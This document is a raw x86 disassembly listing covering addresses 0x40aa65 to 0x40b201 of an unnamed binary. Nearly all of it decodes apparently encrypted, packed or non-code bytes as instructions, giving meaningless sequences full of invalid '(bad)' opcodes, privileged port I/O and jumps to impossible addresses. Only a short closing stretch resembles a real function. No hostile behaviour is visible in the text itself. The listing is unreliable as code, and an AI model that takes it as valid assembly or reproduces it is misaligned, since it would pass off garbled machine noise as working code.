  40aa65:	in     al,0x7e
  40aa67:	fiadd  WORD PTR [eax-0x76ed7e09]
  40aa6d:	ds aad 0xc
  40aa70:	(bad)  [eax-0x21900ed0]
  40aa76:	outs   dx,DWORD PTR ds:[esi]
  40aa77:	pop    ebx
  40aa78:	or     DWORD PTR [esi+0x48f98359],ebp
  40aa7e:	cdq    
  40aa7f:	sar    ebp,cl
  40aa81:	hlt    
  40aa82:	pop    es
  40aa83:	scas   eax,DWORD PTR es:[edi]
  40aa84:	call   0x54f902df
  40aa89:	ins    DWORD PTR es:[edi],dx
  40aa8a:	daa    
  40aa8b:	cs mov fs,edx
  40aa8e:	enter  0x6372,0x33
  40aa92:	mov    bh,0xe0
  40aa94:	std    
  40aa95:	xor    DWORD PTR [esi+0x67],ebx
  40aa98:	xchg   ebx,eax
  40aa99:	adc    al,BYTE PTR cs:[edx]
  40aa9c:	and    bh,BYTE PTR [ebx+ebx*1-0x2c]
  40aaa0:	push   0x70
  40aaa2:	inc    esp
  40aaa4:	mov    ds:0xa6d9b66c,eax
  40aaa9:	cmp    DWORD PTR [edi+0x5f],ebp
  40aaac:	mov    ebx,0x4adcd90c
  40aab1:	dec    eax
  40aab2:	lock push DWORD PTR [edx+0x4f]
  40aab6:	dec    edi
  40aab7:	mov    al,0x32
  40aab9:	stos   BYTE PTR es:[edi],al
  40aaba:	outs   dx,DWORD PTR ds:[esi]
  40aabb:	jg     0x40ab10
  40aabd:	loope  0x40aae1
  40aabf:	xchg   DWORD PTR [edi+eax*1-0x503c5323],ecx
  40aac6:	fimul  WORD PTR [ebx+0x4d4e7d93]
  40aacc:	adc    ebp,DWORD PTR [edi+0x74]
  40aacf:	out    dx,al
  40aad0:	mov    DWORD PTR [ebx-0x62],esi
  40aad3:	addr16 sub al,0x99
  40aad6:	rcl    BYTE PTR [esi+ebx*8+0x49500ca8],cl
  40aadd:	lea    edi,[esi]
  40aadf:	test   bl,ch
  40aae1:	adc    bl,BYTE PTR [esi-0x1324f115]
  40aae7:	mov    esp,DWORD PTR [ebp-0x72]
  40aaea:	and    eax,0x19557680
  40aaef:	cdq    
  40aaf0:	aaa    
  40aaf1:	ss in  eax,dx
  40aaf3:	les    esi,FWORD PTR [edi+0x3dadadc9]
  40aaf9:	or     DWORD PTR [edi+0x7322d16b],ebp
  40aaff:	mov    ch,0x44
  40ab01:	push   esp
  40ab02:	xor    al,0xfb
  40ab04:	sbb    al,BYTE PTR [esi+0x31]
  40ab07:	xchg   BYTE PTR [esi-0x35176886],dl
  40ab0d:	pop    ebp
  40ab0e:	outs   dx,BYTE PTR ds:[esi]
  40ab0f:	inc    ebp
  40ab10:	xor    DWORD PTR [ebp-0xce97d04],0xffffffb6
  40ab17:	fisubr WORD PTR [ecx-0x3e764572]
  40ab1d:	test   ebp,edi
  40ab1f:	enter  0x1a98,0xb0
  40ab23:	mov    ds:0x20fd06,eax
  40ab28:	xchg   ebx,eax
  40ab29:	jg     0x40aaf4
  40ab2b:	adc    eax,0x4f897f41
  40ab30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab31:	retf   0x1a2
  40ab34:	je     0x40ab88
  40ab36:	and    cl,cl
  40ab38:	jns    0x40ab49
  40ab3a:	push   esp
  40ab3b:	lahf   
  40ab3c:	jo     0x40aad2
  40ab3e:	rcl    DWORD PTR [edx],0x29
  40ab41:	push   ss
  40ab42:	mov    dl,0xa8
  40ab44:	enter  0xfde5,0x37
  40ab48:	add    edx,ebx
  40ab4a:	cmp    bl,cl
  40ab4c:	xchg   esp,eax
  40ab4d:	inc    edx
  40ab4e:	pop    eax
  40ab4f:	pop    esi
  40ab50:	mov    eax,ds:0x824a26d1
  40ab55:	repnz xor eax,0x3c7a4e7c
  40ab5b:	pop    ecx
  40ab5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab5d:	shl    BYTE PTR [edx+0x2103b7fd],1
  40ab63:	jnp    0x40ab5e
  40ab65:	sbb    esp,DWORD PTR [ebx]
  40ab67:	stos   DWORD PTR es:[edi],eax
  40ab68:	ja     0x40ab16
  40ab6a:	add    eax,0xf5952c07
  40ab6f:	sub    BYTE PTR [edx+0x53],dh
  40ab72:	outs   dx,BYTE PTR ds:[esi]
  40ab73:	push   edi
  40ab74:	in     eax,0x89
  40ab76:	pop    ebx
  40ab77:	cmc    
  40ab78:	jo     0x40ab6c
  40ab7a:	cmp    esp,DWORD PTR [eax+0x7947b755]
  40ab80:	mov    eax,ds:0xe118561d
  40ab85:	int3   
  40ab86:	sub    eax,0x916b3129
  40ab8b:	unpcklps xmm1,XMMWORD PTR [esi]
  40ab8e:	fst    DWORD PTR [ecx+0x34e140f6]
  40ab94:	pop    esp
  40ab95:	or     al,0xb
  40ab97:	(bad)  
  40ab98:	cmp    BYTE PTR [ebx-0x51],cl
  40ab9b:	in     eax,0x1d
  40ab9d:	in     eax,0x39
  40ab9f:	sub    DWORD PTR [edi],0x27
  40aba2:	lahf   
  40aba3:	ret    
  40aba4:	(bad)  
  40aba5:	outs   dx,DWORD PTR ds:[esi]
  40aba6:	mov    ebx,0x3413dd8c
  40abab:	test   al,0x46
  40abad:	dec    edi
  40abae:	sar    BYTE PTR [ecx-0x16],0xb9
  40abb2:	jmp    0x40ac08
  40abb4:	leave  
  40abb5:	dec    eax
  40abb6:	mov    dl,0x1f
  40abb8:	jmp    0xc04298af
  40abbd:	dec    ebx
  40abbe:	ret    
  40abbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abc1:	shl    DWORD PTR [esi],0xd6
  40abc4:	xor    al,BYTE PTR [bx+di-0x20]
  40abc8:	mov    ah,BYTE PTR [ebx]
  40abca:	sub    DWORD PTR [esi],edx
  40abcc:	sbb    cl,BYTE PTR [edx]
  40abce:	and    esi,DWORD PTR [esi-0x36c6022a]
  40abd4:	inc    esi
  40abd5:	fstp   DWORD PTR [edi]
  40abd7:	js     0x40abbf
  40abd9:	push   edi
  40abda:	xor    cl,BYTE PTR [edi+eiz*2-0x4]
  40abde:	rcl    BYTE PTR [esi],1
  40abe0:	mov    edi,0x57410474
  40abe5:	jge    0x40ac3b
  40abe7:	loopne 0x40ac05
  40abe9:	adc    esi,eax
  40abeb:	rcr    al,cl
  40abed:	and    al,0x36
  40abef:	mov    ebp,0xf0ba17c9
  40abf4:	jg     0x40abae
  40abf6:	dec    ecx
  40abf7:	retf   0x1607
  40abfa:	(bad)  
  40abfb:	rcl    BYTE PTR [ebp+0x23bcd04e],1
  40ac01:	mov    eax,?
  40ac03:	jmp    DWORD PTR [edx+0x6bf3c8c9]
  40ac09:	ss xor eax,0xd7825f2c
  40ac0f:	mov    al,0x7b
  40ac11:	outs   dx,BYTE PTR ds:[esi]
  40ac12:	rcr    BYTE PTR [ecx],1
  40ac14:	js     0x40abc5
  40ac16:	gs inc ecx
  40ac18:	lds    esp,FWORD PTR [esi+0x61]
  40ac1b:	push   ss
  40ac1c:	jo     0x40ac1c
  40ac1e:	rcr    BYTE PTR [ecx+0x57],1
  40ac21:	(bad)  
  40ac22:	adc    ch,BYTE PTR [eax-0xa]
  40ac25:	pop    edx
  40ac26:	enter  0xd52c,0x39
  40ac2a:	jp     0x40abf3
  40ac2c:	xchg   ebp,eax
  40ac2d:	test   al,0xd4
  40ac2f:	push   esp
  40ac30:	sar    DWORD PTR [ecx-0x7c],cl
  40ac33:	pop    edi
  40ac34:	fdivr  QWORD PTR [esi+edx*2]
  40ac37:	in     al,dx
  40ac38:	mov    ebp,0x68a34a75
  40ac3d:	arpl   WORD PTR [esp+ecx*2-0x5b],bx
  40ac41:	(bad)  
  40ac42:	or     dh,BYTE PTR [edi+0x518b47a4]
  40ac48:	cld    
  40ac49:	imul   ebx,DWORD PTR [eax+ecx*4+0x34],0xd1db2fd5
  40ac51:	es mov ebp,0xf3c056d3
  40ac57:	push   eax
  40ac58:	adc    DWORD PTR [esi],edx
  40ac5a:	adc    ecx,edi
  40ac5c:	mov    esi,0xc28e709f
  40ac61:	ins    BYTE PTR es:[edi],dx
  40ac62:	mov    eax,0x24e2509f
  40ac67:	xchg   esi,eax
  40ac68:	pcmpgtw mm5,QWORD PTR [ebp-0x16]
  40ac6c:	dec    ebp
  40ac6d:	dec    bh
  40ac6f:	lods   al,BYTE PTR ds:[esi]
  40ac70:	outs   dx,BYTE PTR ds:[esi]
  40ac71:	outs   dx,BYTE PTR ds:[esi]
  40ac72:	pop    edx
  40ac73:	jmp    0xbbc2:0x435c672a
  40ac7a:	xchg   esi,eax
  40ac7b:	test   BYTE PTR [ebx+ebx*1],bl
  40ac7e:	cmp    BYTE PTR [esi-0x6d],cl
  40ac81:	or     DWORD PTR [esi],esi
  40ac83:	mov    gs,ebx
  40ac85:	jmp    0xc3353c44
  40ac8a:	sbb    eax,0x1ab1314e
  40ac8f:	idiv   DWORD PTR [edi]
  40ac91:	fadd   QWORD PTR [eax]
  40ac93:	test   edx,esp
  40ac95:	clc    
  40ac96:	jg     0x40acd9
  40ac98:	sbb    al,0x69
  40ac9a:	repnz cmp ah,BYTE PTR [ebx-0x77a53027]
  40aca1:	nop
  40aca2:	dec    ebx
  40aca3:	mov    eax,ds:0x9e88c5e3
  40aca8:	(bad)  
  40aca9:	das    
  40acaa:	cmp    dl,0x23
  40acad:	sub    BYTE PTR [ebp-0x2cf0ba41],bl
  40acb3:	dec    ebp
  40acb4:	lock and cl,BYTE PTR [ecx]
  40acb7:	in     al,dx
  40acb8:	cmp    DWORD PTR [ebx+0x7d1b10e3],0xffffffbd
  40acbf:	test   al,0x5d
  40acc1:	iret   
  40acc2:	inc    ebx
  40acc3:	push   edx
  40acc4:	and    DWORD PTR [edi+ecx*8],0xffffffbd
  40acc8:	inc    ecx
  40acc9:	push   ss
  40acca:	sahf   
  40accb:	xor    BYTE PTR [ebx-0x20],0x0
  40accf:	test   DWORD PTR [edx-0x7e],0x74b0cd38
  40acd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acd7:	jno    0x40ad10
  40acd9:	dec    ebp
  40acda:	pop    esp
  40acdb:	fnstenv [edx-0x5fd1222c]
  40ace1:	adc    eax,0xb52cc0b6
  40ace6:	fs icebp 
  40ace8:	inc    eax
  40ace9:	sbb    edx,DWORD PTR [ebp+edx*2-0x50]
  40aced:	push   0xffffffee
  40acef:	ins    DWORD PTR es:[edi],dx
  40acf0:	jmp    0x918a:0x5c30
  40acf6:	test   eax,0xbb2e4cd2
  40acfb:	out    0xf9,eax
  40acfd:	mov    dh,al
  40acff:	sahf   
  40ad00:	ds pop es
  40ad02:	jl     0x40acb1
  40ad04:	pusha  
  40ad05:	fcomp  DWORD PTR [esi+esi*1-0x3817818e]
  40ad0c:	sub    cl,BYTE PTR [ecx]
  40ad0e:	push   esi
  40ad0f:	popa   
  40ad10:	jmp    0x40ad0e
  40ad12:	jnp    0x40ac95
  40ad14:	jecxz  0x40ac9d
  40ad16:	imul   edx,DWORD PTR [ecx-0x71],0x1660a0b4
  40ad1d:	mov    esp,ebx
  40ad1f:	and    DWORD PTR [ecx+0xd2737ed],edx
  40ad25:	push   edi
  40ad26:	mov    ds:0x70d9f93e,al
  40ad2b:	inc    esp
  40ad2c:	jg     0x40acf8
  40ad2e:	nop
  40ad2f:	or     eax,0xa6875e7c
  40ad34:	sbb    edi,DWORD PTR [ebx-0x292aa175]
  40ad3a:	pop    esp
  40ad3b:	mov    dl,0x57
  40ad3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad3e:	pusha  
  40ad3f:	clc    
  40ad40:	fst    QWORD PTR [esi-0x4729a64d]
  40ad46:	mov    WORD PTR [ebx+0x7d],fs
  40ad49:	fldenv [ebx+ebx*8-0x5c]
  40ad4d:	sti    
  40ad4e:	fcom   st(7)
  40ad50:	fisub  WORD PTR [ebp+0x34f9a394]
  40ad56:	push   es
  40ad57:	mov    dl,0x84
  40ad59:	mov    ecx,0x5145aef5
  40ad5e:	sar    BYTE PTR [edi-0x636f5ed6],cl
  40ad64:	out    0x84,al
  40ad66:	add    al,0x4
  40ad68:	enter  0xbdd7,0xf5
  40ad6c:	push   ss
  40ad6d:	mov    ah,0xdd
  40ad6f:	rol    DWORD PTR [ecx-0x6549bab5],1
  40ad75:	pop    es
  40ad76:	retf   
  40ad77:	popa   
  40ad78:	not    DWORD PTR [esi-0x40]
  40ad7b:	mov    ebx,edx
  40ad7d:	stos   BYTE PTR es:[edi],al
  40ad7e:	add    DWORD PTR [eax-0x471a8afc],esi
  40ad84:	mov    esi,0x4280c652
  40ad89:	jnp    0x40ad8a
  40ad8b:	popa   
  40ad8c:	lock aaa 
  40ad8e:	mov    BYTE PTR [esi+ebp*1],bl
  40ad91:	out    dx,al
  40ad92:	sbb    eax,0x439bae83
  40ad97:	mov    edi,0x186932ce
  40ad9c:	(bad)
  40ad9f:	sbb    BYTE PTR [ebp+0x188fd339],0x21
  40ada6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ada7:	jmp    0x40ade1
  40ada9:	ss clc 
  40adab:	stos   DWORD PTR es:[edi],eax
  40adac:	mov    bl,0x4a
  40adae:	rcl    BYTE PTR [esi+edi*8-0x16],1
  40adb2:	jmp    0x9768e611
  40adb7:	fcomp  DWORD PTR [ebp-0x2cab893e]
  40adbd:	xchg   BYTE PTR [ebx-0x63],ch
  40adc0:	or     bh,BYTE PTR [ebx+0x3f1282a3]
  40adc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc7:	(bad)  
  40adc9:	mov    esp,0xf46fbf4b
  40adce:	pop    eax
  40adcf:	xchg   edx,eax
  40add0:	dec    edx
  40add1:	jmp    0x40ada5
  40add3:	dec    ebp
  40add4:	loope  0x40ae26
  40add6:	or     ch,BYTE PTR [edi+edi*1-0x55cffa3d]
  40addd:	in     eax,0xff
  40addf:	sub    al,0x4b
  40ade1:	std    
  40ade2:	jp     0x40adc5
  40ade4:	call   0x1843716b
  40ade9:	mov    al,ds:0x5f49b8f7
  40adee:	mov    ss,WORD PTR [ebp-0x4b20e4d3]
  40adf4:	pop    ebp
  40adf5:	jb     0x40ae48
  40adf7:	sub    cl,cl
  40adf9:	(bad)  
  40adfb:	jb     0x40ae73
  40adfd:	in     eax,dx
  40adfe:	and    eax,0x64f643d9
  40ae03:	aam    0x1
  40ae05:	pop    ecx
  40ae06:	jbe    0x40ae1b
  40ae08:	adc    BYTE PTR [edi-0x74519161],0x33
  40ae0f:	add    BYTE PTR [ebx+0xe],dl
  40ae12:	pop    es
  40ae13:	fbld   TBYTE PTR [edi-0x4a]
  40ae16:	jnp    0x40ae10
  40ae18:	xchg   ebx,eax
  40ae19:	xor    BYTE PTR [esi+0x13],bh
  40ae1c:	loope  0x40adf3
  40ae1e:	aam    0xc9
  40ae20:	ret    
  40ae21:	idiv   DWORD PTR [eax+0x50fe6e54]
  40ae27:	imul   esp,DWORD PTR ds:0x79073396,0x76
  40ae2e:	xor    al,0x33
  40ae30:	pop    edi
  40ae31:	mov    WORD PTR [esp+eiz*2],ss
  40ae34:	jl     0x40adf1
  40ae36:	dec    ebx
  40ae37:	inc    ebx
  40ae38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae39:	jns    0x40ae6b
  40ae3b:	std    
  40ae3c:	push   ebx
  40ae3d:	lock mov bl,BYTE PTR [ecx+0x15]
  40ae41:	loope  0x40ae53
  40ae43:	in     eax,dx
  40ae44:	ret    0x99dc
  40ae47:	std    
  40ae48:	das    
  40ae49:	sahf   
  40ae4a:	jb     0x40ae21
  40ae4c:	fdivr  QWORD PTR [ebp-0x52f9ff5f]
  40ae52:	mov    eax,0x2e9fa7a6
  40ae57:	js     0x40ae09
  40ae59:	jne    0x40ae93
  40ae5b:	mov    al,0x8
  40ae5d:	pop    eax
  40ae5e:	(bad)  
  40ae5f:	mov    esp,0xf1dd9a4d
  40ae64:	sbb    BYTE PTR [edx+0x1ddeebfd],dh
  40ae6a:	mov    dl,0x31
  40ae6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae6d:	ss sahf 
  40ae6f:	add    DWORD PTR [esi],0x5b
  40ae72:	imul   ebx,DWORD PTR [edx-0x1],0x22
  40ae76:	std    
  40ae77:	jbe    0x7f4cd2b8
  40ae7d:	inc    esp
  40ae7e:	dec    ebp
  40ae7f:	inc    ebp
  40ae80:	loope  0x40ae6b
  40ae82:	pop    esp
  40ae83:	adc    eax,0x474e05ab
  40ae88:	ins    BYTE PTR es:[edi],dx
  40ae89:	push   ebx
  40ae8a:	aam    0xb
  40ae8c:	cmp    al,0x7d
  40ae8e:	cmc    
  40ae8f:	adc    al,0xb2
  40ae91:	ins    BYTE PTR es:[edi],dx
  40ae92:	nop
  40ae93:	sub    BYTE PTR [ebx],cl
  40ae95:	adc    dl,BYTE PTR [edi+0xc]
  40ae98:	push   0x51
  40ae9a:	cmc    
  40ae9b:	jmp    0x62833ac7
  40aea0:	sbb    al,0xe6
  40aea2:	mov    ebp,0x52f33fee
  40aea7:	cmp    BYTE PTR [eax],ah
  40aea9:	jl     0x40aecd
  40aeab:	adc    edi,esi
  40aead:	cld    
  40aeae:	add    eax,0xedf81c61
  40aeb3:	and    eax,0x32e7f18b
  40aeb8:	loop   0x40aee6
  40aeba:	mov    esp,0xa7c21a9
  40aebf:	push   ds
  40aec0:	stos   DWORD PTR es:[edi],eax
  40aec1:	inc    esp
  40aec2:	sbb    DWORD PTR [ebx+edi*8-0x6f],0x881bee7c
  40aeca:	jnp    0x40af1c
  40aecc:	retf   0xbf66
  40aecf:	xor    BYTE PTR [ebp+0x2a],al
  40aed2:	(bad)  
  40aed3:	jns    0x40af01
  40aed5:	push   ecx
  40aed6:	(bad)  [edx-0x79]
  40aed9:	adc    BYTE PTR [ebx*4+0x10a58b5b],ch
  40aee0:	sbb    al,BYTE PTR [edx]
  40aee2:	pop    es
  40aee3:	jecxz  0x40aef2
  40aee5:	mov    eax,0x36c94a7c
  40aeea:	mov    esp,0x6295f6ff
  40aeef:	lock sub esp,DWORD PTR [eax+edi*4+0x30b4603]
  40aef7:	fcom   DWORD PTR [ebx+ebx*4]
  40aefa:	and    DWORD PTR ss:[eax],ebp
  40aefd:	adc    cl,BYTE PTR ds:0xe2b39134
  40af03:	out    0x65,eax
  40af05:	mov    dh,0x6f
  40af07:	pop    edx
  40af08:	cmp    BYTE PTR [ecx],ah
  40af0a:	mov    eax,ds:0x1cf3b9d7
  40af0f:	loope  0x40af18
  40af11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af12:	lods   eax,DWORD PTR ds:[esi]
  40af13:	int3   
  40af14:	sub    edi,DWORD PTR [ecx-0x31]
  40af17:	in     al,0x10
  40af19:	(bad)  
  40af1b:	jns    0x40af5f
  40af1d:	push   ss
  40af1e:	cdq    
  40af1f:	inc    esi
  40af20:	sbb    al,0x9e
  40af22:	je     0x40af71
  40af24:	adc    eax,edx
  40af26:	ss jmp 0x52b:0x57839ecc
  40af2e:	shr    bl,1
  40af30:	or     BYTE PTR [ebp+0x2739f9a3],cl
  40af36:	and    esp,0x48
  40af39:	add    esi,ebx
  40af3b:	scas   al,BYTE PTR es:[edi]
  40af3c:	std    
  40af3d:	fwait
  40af3e:	fs pushf 
  40af40:	retf   0x3758
  40af43:	cmc    
  40af44:	dec    esp
  40af45:	mov    dl,0x29
  40af47:	sub    al,0x25
  40af49:	cmp    eax,0x1b52bf5e
  40af4e:	and    eax,edx
  40af50:	jmp    0x40aeed
  40af52:	inc    edx
  40af53:	shl    BYTE PTR [eax+eiz*8+0x6871d337],cl
  40af5a:	cs in  eax,0xb7
  40af5d:	leave  
  40af5e:	mov    ?,WORD PTR [ebx+0x58]
  40af61:	cmp    edi,edi
  40af63:	sbb    eax,0x7fb17c06
  40af68:	sub    ch,0x5b
  40af6b:	shl    DWORD PTR [eax],1
  40af6d:	mov    al,ds:0xeb825f62
  40af72:	add    al,0xb4
  40af74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af75:	scas   eax,DWORD PTR es:[edi]
  40af76:	inc    ebp
  40af77:	adc    eax,0xb422854d
  40af7c:	aas    
  40af7d:	push   ecx
  40af7e:	lods   eax,DWORD PTR ds:[esi]
  40af7f:	and    bl,BYTE PTR [ebx-0x17ddecfb]
  40af85:	sar    DWORD PTR [edx+0x7a0b142d],0x85
  40af8c:	push   esp
  40af8d:	icebp  
  40af8e:	mov    cl,0x3f
  40af90:	mov    eax,ds:0x6bae872e
  40af95:	inc    edx
  40af96:	xor    DWORD PTR [edx+0x4d],edx
  40af99:	mov    DWORD PTR [ebx],eax
  40af9b:	imul   eax,DWORD PTR [eax+0x33],0xffffffbc
  40af9f:	xchg   esp,eax
  40afa0:	xchg   ebp,eax
  40afa1:	fs pop ebp
  40afa3:	mov    dh,0xc8
  40afa5:	xor    al,0x5e
  40afa7:	in     al,0xe3
  40afa9:	call   0x2765c3ba
  40afae:	mov    bl,0x77
  40afb0:	(bad)  
  40afb2:	dec    ebp
  40afb3:	loop   0x40b02e
  40afb5:	imul   edi,DWORD PTR [esi+0x41],0x46
  40afb9:	xor    eax,DWORD PTR [ebp-0x1e61a4ed]
  40afbf:	enter  0x75a8,0x2a
  40afc3:	dec    ebx
  40afc4:	mov    ebp,0x2c3076f3
  40afc9:	jae    0x40b022
  40afcb:	add    al,0x54
  40afcd:	in     eax,dx
  40afce:	dec    esp
  40afcf:	mov    BYTE PTR [ebx-0x37f7bf97],bl
  40afd5:	jno    0x40afa4
  40afd7:	cmp    ah,BYTE PTR [edx+0x77d168a3]
  40afdd:	add    bl,bl
  40afdf:	and    BYTE PTR [edx],al
  40afe1:	mov    ebx,0xa26d4b2c
  40afe6:	mov    ss,WORD PTR [ebx-0x5474e15a]
  40afec:	fmul   QWORD PTR [ecx+0x45]
  40afef:	gs aad 0x59
  40aff2:	cmp    al,0x96
  40aff4:	fidiv  WORD PTR [ecx-0x6f]
  40aff7:	sahf   
  40aff8:	(bad)  
  40aff9:	fidivr DWORD PTR [esi+eax*2+0x6fd9b6a5]
  40b000:	mov    edi,0x478fb799
  40b005:	add    al,0x9d
  40b007:	leave  
  40b008:	test   al,0x64
  40b00a:	repnz into 
  40b00c:	xor    edx,DWORD PTR [ecx+0x5265fc78]
  40b012:	out    0x36,al
  40b014:	data16 mov bh,0x9f
  40b017:	pop    ebp
  40b018:	sbb    bh,0xf0
  40b01b:	not    DWORD PTR [esi+0x422f869c]
  40b021:	mov    ebp,DWORD PTR [esi]
  40b023:	ficom  DWORD PTR [eax-0x17]
  40b026:	fst    DWORD PTR [ebx-0x4]
  40b029:	pop    ds
  40b02a:	xchg   ecx,eax
  40b02b:	mov    ?,WORD PTR [edx]
  40b02d:	dec    esi
  40b02e:	(bad)  
  40b02f:	sbb    ebp,eax
  40b031:	scas   eax,DWORD PTR es:[edi]
  40b032:	inc    ebp
  40b033:	cmp    BYTE PTR ds:0x6e157105,dl
  40b039:	or     al,0xca
  40b03b:	jg     0x40b022
  40b03d:	loopne 0x40b051
  40b03f:	fstp   TBYTE PTR [ebx]
  40b041:	dec    edi
  40b042:	imul   BYTE PTR [edx]
  40b044:	ja     0x40b07d
  40b046:	ja     0x40afea
  40b048:	out    0x87,eax
  40b04a:	cs cs test al,al
  40b04e:	int3   
  40b04f:	aaa    
  40b050:	and    bl,BYTE PTR [edx-0x5f17411d]
  40b056:	rol    esi,cl
  40b058:	adc    DWORD PTR [edx+0x615e871f],edi
  40b05e:	xchg   esp,eax
  40b05f:	and    bh,BYTE PTR [eax]
  40b061:	inc    eax
  40b062:	xchg   esi,eax
  40b063:	push   ds
  40b064:	addr16 cmp eax,0x195f0e01
  40b06a:	pop    ebx
  40b06b:	out    0x20,eax
  40b06d:	jge    0x40b0af
  40b06f:	mov    DWORD PTR [ebp-0xf7aa5ff],ecx
  40b075:	jp     0x40b0d0
  40b077:	ins    BYTE PTR es:[edi],dx
  40b078:	and    al,0x79
  40b07a:	mul    BYTE PTR [eax]
  40b07c:	out    dx,al
  40b07d:	sbb    cl,0xf7
  40b080:	mov    al,ds:0xaddff9b4
  40b085:	cli    
  40b086:	mov    ah,0x21
  40b088:	or     bh,BYTE PTR [ebp-0x3a]
  40b08b:	add    esi,ebx
  40b08d:	jge    0x40b031
  40b08f:	push   cs
  40b090:	imul   eax,DWORD PTR [eax+0x4f],0x8d421e67
  40b097:	mov    gs,eax
  40b099:	or     eax,0x4dae4946
  40b09e:	push   0xb119de48
  40b0a3:	and    cl,BYTE PTR [esi]
  40b0a5:	imul   ecx,DWORD PTR [edi-0x22],0x4f
  40b0a9:	cmp    DWORD PTR [edi-0x75be9401],0x1775a819
  40b0b3:	lods   al,BYTE PTR ds:[esi]
  40b0b4:	(bad)  
  40b0b5:	je     0x40b11d
  40b0b7:	jl     0x40b109
  40b0b9:	jns    0x40b0ec
  40b0bb:	xor    esi,edi
  40b0bd:	lods   eax,DWORD PTR ds:[esi]
  40b0be:	stos   BYTE PTR es:[edi],al
  40b0bf:	add    BYTE PTR ds:0xd2c29b3b,0x49
  40b0c6:	inc    ebp
  40b0c7:	add    DWORD PTR [eax],edx
  40b0c9:	fisub  DWORD PTR [edi]
  40b0cb:	and    cl,0x73
  40b0ce:	aas    
  40b0cf:	out    0x2e,eax
  40b0d1:	pop    ecx
  40b0d2:	or     DWORD PTR [esi-0x7e60f30e],edi
  40b0d8:	mov    bl,0x59
  40b0db:	push   esi
  40b0dc:	xor    BYTE PTR [ebp-0x5c],bl
  40b0df:	or     esp,eax
  40b0e1:	lea    edi,[eax+eax*2+0x3f04a075]
  40b0e8:	push   cs
  40b0e9:	pop    ds
  40b0ea:	sbb    eax,0x66fb3241
  40b0ef:	adc    di,WORD PTR [eax]
  40b0f2:	call   0x5eaf:0xe663ec5
  40b0f9:	jge    0x40b08a
  40b0fb:	mov    edi,0x895413be
  40b100:	popf   
  40b101:	cmp    eax,0xc6676085
  40b106:	mov    edx,0x5f7f69f3
  40b10b:	fdivr  st(5),st
  40b10d:	rcpps  xmm0,XMMWORD PTR [edx+0x73]
  40b111:	hlt    
  40b112:	imul   ebx,DWORD PTR [ecx+0x6cd6295a],0xe7b65d0f
  40b11c:	setp   BYTE PTR [edi]
  40b11f:	into   
  40b120:	cld    
  40b121:	cld    
  40b122:	test   DWORD PTR [ecx+0x1c],ecx
  40b125:	ins    DWORD PTR es:[edi],dx
  40b126:	(bad)  
  40b127:	cmp    eax,0xad30dee3
  40b12c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b12e:	xor    BYTE PTR [ecx],bh
  40b130:	jo     0x40b13a
  40b132:	sti    
  40b133:	mov    al,ds:0xc1d4add2
  40b138:	lock sti 
  40b13a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b13b:	add    BYTE PTR [edi+eax*2],bl
  40b13e:	cli    
  40b13f:	add    DWORD PTR [eiz*4-0x7566059c],edi
  40b146:	retf   0x51e1
  40b149:	mov    eax,0xb7d0a8cd
  40b14e:	or     BYTE PTR [ebx-0x26],dh
  40b151:	repnz cmp BYTE PTR ds:0x1f18f440,bl
  40b158:	outs   dx,DWORD PTR ds:[esi]
  40b159:	pop    es
  40b15a:	cmp    eax,0xca711a37
  40b15f:	push   ss
  40b160:	inc    esi
  40b161:	add    al,0x8f
  40b163:	pop    ebp
  40b164:	jbe    0x40b1b3
  40b166:	data16 xor BYTE PTR [ecx-0x23258497],bh
  40b16d:	pop    edi
  40b16e:	jecxz  0x40b1c1
  40b170:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b171:	stos   DWORD PTR es:[edi],eax
  40b172:	mov    edx,0x829b1e69
  40b177:	lock fidivr DWORD PTR [eax+0x1a8b73c4]
  40b17e:	mov    edx,DWORD PTR [esi-0x6248dc9b]
  40b184:	add    ecx,DWORD PTR [edx+0x6828697e]
  40b18a:	and    ecx,esi
  40b18c:	popf   
  40b18d:	idiv   cl
  40b18f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b190:	arpl   ax,ax
  40b192:	out    0xe7,al
  40b194:	push   edi
  40b195:	aad    0xba
  40b197:	mov    eax,DWORD PTR [ebp+0x18]
  40b19a:	mov    esi,DWORD PTR [ebp+0x10]
  40b19d:	mov    DWORD PTR [esi+0xc],eax
  40b1a0:	mov    eax,DWORD PTR [ebp+0x1c]
  40b1a3:	mov    esi,DWORD PTR [ebp+0x10]
  40b1a6:	mov    DWORD PTR [esi+0x10],eax
  40b1a9:	mov    eax,DWORD PTR [ebp+0x8]
  40b1ac:	xor    eax,ecx
  40b1ae:	add    eax,edx
  40b1b0:	pop    esi
  40b1b1:	leave  
  40b1b2:	ret    0x18
  40b1b5:	push   ebp
  40b1b6:	mov    ebp,esp
  40b1b8:	mov    eax,ds:0x41e2ac
  40b1bd:	sub    ecx,DWORD PTR ds:0x432010
  40b1c3:	mov    eax,DWORD PTR [eax+0x1c8]
  40b1c9:	mov    eax,DWORD PTR [eax]
  40b1cb:	sub    DWORD PTR ds:0x42f004,0x167a
  40b1d5:	cdq    
  40b1d6:	sub    ecx,DWORD PTR ds:0x431000
  40b1dc:	push   ebx
  40b1dd:	add    ebx,0x2084
  40b1e3:	mov    ecx,0xfabdbef1
  40b1e8:	add    eax,ecx
  40b1ea:	inc    ebx
  40b1eb:	adc    edx,0xffffffff
  40b1ee:	push   esi
  40b1ef:	push   edi
  40b1f0:	mov    edi,edx
  40b1f2:	mov    DWORD PTR ds:0x432004,0x5236
  40b1fc:	mov    edx,DWORD PTR [ebp+0x8]
  40b1ff:	mov    ebx,eax
  40b201:	mov    eax,0x8a29a123
